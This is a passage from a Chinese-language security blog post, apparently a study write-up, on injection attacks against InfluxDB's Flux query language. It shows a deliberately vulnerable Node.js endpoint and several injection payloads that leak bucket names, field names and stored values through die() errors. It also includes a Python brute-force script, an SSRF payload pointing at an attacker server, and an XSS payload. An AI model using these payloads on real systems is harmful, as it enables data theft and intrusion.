</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">results</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/query&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">fluxQuery</span> <span class="o">=</span> <span class="s1">&#39;from(bucket:&#34;&#39;</span> <span class="o">+</span> <span class="nx">bucket</span> <span class="o">+</span> <span class="s1">&#39;&#34;) |&gt; range(start: 0)  |&gt; filter(fn: (r) =&gt; r._field == &#34;public_field&#34; and r._value == &#34;&#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="s1">&#39;&#34;) &#39;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server started on port </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>当我们只传入<code>&quot;</code>的时候







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql16.png">

  
</figure>

发现了报错，也就是：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fluxQuery</span> <span class="o">=</span> <span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">from(bucket:&#34;&#39;</span> <span class="o">+</span> <span class="nx">bucket</span> <span class="o">+</span> <span class="s1">&#39;&#34;) 
</span></span></span><span class="line"><span class="cl"><span class="s1">|&gt; range(start: 0)  
</span></span></span><span class="line"><span class="cl"><span class="s1">|&gt; filter(fn: (r) =&gt; r._field == &#34;public_field&#34; and r._value == &#34;&#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="s1">&#39;&#34;) &#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">)</span>
</span></span></code></pre></div><p>这样的查询语句，其报错内容在 <a
  href="https://docs.influxdata.com/influxdb/v2.7/"
    target="_blank"
  >https://docs.influxdata.com/influxdb/v2.7/</a> 可以查找到，所以可以知道是influxdb的数据库</p>

<h3 class="relative group">构建一些playload 
    <div id="构建一些playload" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%9e%84%e5%bb%ba%e4%b8%80%e4%ba%9bplayload" aria-label="Anchor">#</a>
    </span>        
    
</h3>

<h4 class="relative group">泄露bucket的名称 
    <div id="泄露bucket的名称" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%b3%84%e9%9c%b2bucket%e7%9a%84%e5%90%8d%e7%a7%b0" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>playload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="err">&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="nx">buckets</span><span class="p">()</span> <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">name</span> <span class="o">=~</span> <span class="sr">/^a.*/</span> <span class="nx">and</span> <span class="nx">die</span><span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="nx">r</span><span class="p">.</span><span class="nx">name</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"><span class="c1">//
</span></span></span></code></pre></div><ol>
<li>该<code>buckets()</code>函数列出当前数据库中的所有存储桶。</li>
<li>该<code>filter()</code>函数使用<code>r.name</code>表达式来过滤存储桶名称，该名称<code>r</code>是存储桶查询的结果，并且<code>name</code>是函数中返回的字段<code>buckets()</code>。</li>
<li>如您所见，InfluxDB 查询支持正则表达式操作<code>=~</code>，因此条件背后的逻辑<code>r.name =~ /^a.*/</code>是，<code>true</code>如果存储桶名称以字母 开头，则为该条件<code>a</code>。</li>
<li>之后，过滤器使用一个<code>and</code>条件来调用函数，<code>die()</code>并将存储桶名称的值作为参数。该<code>die()</code>函数会抛出一个错误，并在第一个参数中传递自定义消息，这将泄漏存储桶名称。</li>
<li>有效负载也在<code>yield()</code>存储桶查询之前使用该函数。这是在 InfluxDB 上的单个请求中执行“多个查询”所必需的。</li>
<li>最后，有必要用<code>yield()</code>一个新行将 与存储桶查询分开，并且在有效负载的末尾，我在<code>//</code>另一个新行后面添加了表达式，以注释注入后的所有内容。</li>
</ol>
<p>也就是如果数据库中存在以<code>a</code>开头的数据库名，他就会返回其name，如果没有的话就会返回null
当为<code>a</code>时：







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql17.png">

  
</figure>

当为<code>p</code>时：







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql18.png">

  
</figure>

可以看见返回了<code>privateBucket</code>这个bucket，这个地方可以用burp爆
exp.py:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://127.0.0.1:3000?query=&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">para1</span><span class="o">=</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="k">yield</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="s2">&#34;1337&#34;</span><span class="p">)</span> <span class="n">buckets</span><span class="p">()</span> <span class="o">|&gt;</span> <span class="nb">filter</span><span class="p">(</span><span class="n">fn</span><span class="p">:</span> <span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="n">r</span><span class="o">.</span><span class="n">name</span> <span class="o">=~</span> <span class="o">/^</span><span class="p">{}</span><span class="o">.*/</span> <span class="ow">and</span> <span class="n">die</span><span class="p">(</span><span class="n">msg</span><span class="p">:</span><span class="n">r</span><span class="o">.</span><span class="n">name</span><span class="p">))</span> <span class="o">//</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">sensitive_field</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">52</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">htmlLen</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="n">para1</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">j</span><span class="p">))</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">flag</span> <span class="ow">in</span> <span class="n">htmlLen</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">htmlLen</span><span class="p">,</span><span class="n">endd</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">为了让你们更加直观的看见playload</span><span class="err">，</span><span class="n">所以这里没有进行编码</span><span class="err">，</span><span class="n">所以可能在para1处会报错</span><span class="err">。</span>
</span></span></code></pre></div>
<h4 class="relative group">泄露bucket及其相关数据 
    <div id="泄露bucket及其相关数据" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%b3%84%e9%9c%b2bucket%e5%8f%8a%e5%85%b6%e7%9b%b8%e5%85%b3%e6%95%b0%e6%8d%ae" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>前面已经有bucket的名称了，所以就直接from</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="s2">&#34;) 
</span></span></span><span class="line"><span class="cl"><span class="s2"> from(bucket: &#34;</span><span class="nx">privateBucket</span><span class="err">&#34;</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="nx">range</span><span class="p">(</span><span class="nx">start</span><span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">die</span><span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="nx">r</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"> <span class="c1">//
</span></span></span></code></pre></div><p>这里就是把<code>filter</code>中的<code>r</code>也就是匹配出来的所有东西都输出出来
最终页面返回：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="nx">_value</span><span class="o">:</span> <span class="nx">B</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nx">_time</span><span class="o">:</span> <span class="nx">time</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nx">_stop</span><span class="o">:</span> <span class="nx">time</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nx">_start</span><span class="o">:</span> <span class="nx">time</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nx">_measurement</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nx">_field</span><span class="o">:</span> <span class="nx">string</span>
</span></span></code></pre></div><p>也就是这个bucket中的所有的结构和其对应的数据类型，那么接下来便可以爆破其字段的名称</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="s2">&#34;)
</span></span></span><span class="line"><span class="cl"><span class="s2"> from(bucket: &#34;</span><span class="nx">privateBucket</span><span class="err">&#34;</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="nx">range</span><span class="p">(</span><span class="nx">start</span><span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_field</span> <span class="o">=~</span> <span class="sr">/s.*/</span> <span class="nx">and</span> <span class="nx">die</span><span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="nx">r</span><span class="p">.</span><span class="nx">_field</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"> <span class="c1">//
</span></span></span></code></pre></div><p>也就是爆破出以<code>s</code>开头的字段名称，这个和前面泄露bucket名的是一个原理







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql19.png">

  
</figure>

可以看见这个字段名为:<code>sensitive_field</code>
接下来就是爆其数据了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="s2">&#34;)
</span></span></span><span class="line"><span class="cl"><span class="s2"> from(bucket: &#34;</span><span class="nx">privateBucket</span><span class="s2">&#34;) |&gt; range(start: 0) |&gt; filter(fn: (r) =&gt; r._field == &#34;</span><span class="nx">sensitive_field</span><span class="err">&#34;</span> <span class="nx">and</span> <span class="nx">die</span><span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="nx">string</span><span class="p">(</span><span class="nx">v</span><span class="o">:</span><span class="nx">r</span><span class="p">.</span><span class="nx">_value</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"> <span class="c1">//
</span></span></span></code></pre></div><p>注意下这里的数据类型！！不然可能会报错(放出为int类型的时候，<strong>因为r.field默认为int类型</strong>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="nl">HttpError</span><span class="p">:</span> <span class="n">runtime</span> <span class="n">error</span> <span class="err">@</span><span class="mi">2</span><span class="o">:</span><span class="mi">54</span><span class="o">-</span><span class="mi">2</span><span class="o">:</span><span class="mi">124</span><span class="o">:</span> <span class="nl">filter</span><span class="p">:</span> <span class="n">type</span> <span class="nl">conflict</span><span class="p">:</span> <span class="n">string</span> <span class="o">!=</span> <span class="kt">int</span>
</span></span></code></pre></div><p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql20.png">

  
</figure>

可以看见这里的值为1337</p>

<h2 class="relative group">SSRF利用 
    <div id="ssrf利用" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ssrf%e5%88%a9%e7%94%a8" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>在官方文档中，可以看见influxdb在from函数之中是可以接受host参数的







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql21.png">

  
</figure>

所以可以构造playload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="s2">&#34;) |&gt; yield(name: &#34;</span><span class="mi">1337</span><span class="s2">&#34;)
</span></span></span><span class="line"><span class="cl"><span class="s2"> from(bucket: &#34;</span><span class="mi">1337</span><span class="s2">&#34;, host:&#34;</span><span class="nx">https</span><span class="o">:</span><span class="c1">//ATTACKER-SERVER&#34;) |&gt; range(start:0)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="c1">//
</span></span></span></code></pre></div>
<h2 class="relative group">XSS利用 
    <div id="xss利用" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#xss%e5%88%a9%e7%94%a8" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>看见上面构建的程序</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-node.js" data-lang="node.js"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/query&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">fluxQuery</span> <span class="o">=</span> <span class="s1">&#39;from(bucket:&#34;&#39;</span> <span class="o">+</span> <span class="nx">bucket</span> <span class="o">+</span> <span class="s1">&#39;&#34;) |&gt; range(start: 0)  |&gt; filter(fn: (r) =&gt; r._field == &#34;public_field&#34; and r._value == &#34;&#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">data</span> <span class="o">+</span> <span class="s1">&#39;&#34;) &#39;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">fluxQuery</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>当 InfluxDB 查询中发生错误时，该<code>try{ } catch{ }</code>语句会将错误发送回客户端，并使用<code>Content-Type</code>equals to <code>text/html</code>，允许浏览器加载 HTML 和 JavaScript。
这个时候我们就可以利用die函数在浏览器上执行xss</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="s2">&#34;) die(msg:&#34;</span><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)</span><span class="o">&gt;</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">//
</span></span></span></code></pre></div><p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql22.png">

  
</figure>
</p>
<p>参考文章：
<a
  href="https://xz.aliyun.com/t/9908?time__1311=n4%2BxuDgD9Am4BlDRDBqDqpDU2fDcYoEEOBrGYD#toc-8"
    target="_blank"
  >https://xz.aliyun.com/t/9908?time__1311=n4%2BxuDgD9Am4BlDRDBqDqpDU2fDcYoEEOBrGYD#toc-8</a>
<a
  href="https://portswigger.net/web-security/nosql-injection#exploiting-nosql-operator-injection-to-extract-data"
    target="_blank"
  >https://portswigger.net/web-security/nosql-injection#exploiting-nosql-operator-injection-to-extract-data</a>
<a
  href="https://rafa.hashnode.dev/influxdb-nosql-injection#heading-influxdb-nosql-queries"
    target="_blank"
  >https://rafa.hashnode.dev/influxdb-nosql-injection#heading-influxdb-nosql-queries</a>
<a
  href="https://docs.influxdata.com/influxdb/v2/"
    target="_blank"
  >https://docs.influxdata.com/influxdb/v2/</a></p>
          
          
          
        </div>
        
          
  
  
  
  
  
  

  

  
    
    
<div class="flex author">
  
    
    
      
    
    
      
        
      
      <img
        class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4"
        width="96"
        height="96"
        alt="Delete&#39;s blog"
        src="/1_hu_c26274e0bb643934.jpg">
    
  
  <div class="place-self-center">
    
      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
        Author
      </div>
      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
        Delete&rsquo;s blog
      </div>
    
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="delete@student.gdufe.edu.cn"
          target="_blank"
          aria-label="Email"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/ML-hacker"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
        >
      
    
  </div>

</div>
  </div>
</div>

  

  

  
    <div class="mb-10"></div>
  

        
        

        

        

      </div>

      
      
        
        
          
          
        
        
        
        <script
          type="text/javascript"
          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
          data-oid="views_posts\nosql-inject.md"
          data-oid-likes="likes_posts\nosql-inject.md"></script>
      
    </section>

    
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/ctfshow-yuandan/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >CTFshow元旦水友赛部分wp-web</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-01-25T22:14:21&#43;08:00">25 January 2024</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/ld_preload/">
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >LD_PRELOAD学习</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-02-21T20:53:41&#43;08:00">21 February 2024</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
        
          
        
      
    </footer>
  </article>

        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
  <a
    href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      
      
        
      
      
      
      
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 overflow-x-auto py-2">
        <ul class="flex list-none flex-row">
          
